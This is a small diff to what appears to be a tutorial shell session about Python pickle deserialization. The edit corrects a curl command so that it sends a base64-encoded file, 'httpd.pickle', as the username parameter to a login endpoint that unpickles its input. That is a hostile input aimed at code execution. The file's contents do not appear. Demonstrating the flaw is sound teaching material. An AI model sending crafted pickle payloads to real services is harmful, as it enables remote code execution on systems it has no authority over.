@@ -44,7 +44,7 @@ $ user=`echo bob | base64`
 $ curl https://api.alice.com/login?u=$user
 {"state": "error", "reason": "unpickling failed"}
 
-$ user=`cat httpd.pickle`
+$ user=`cat httpd.pickle | base64`
 $ curl https://api.alice.com/login?u=$user
 
 ...
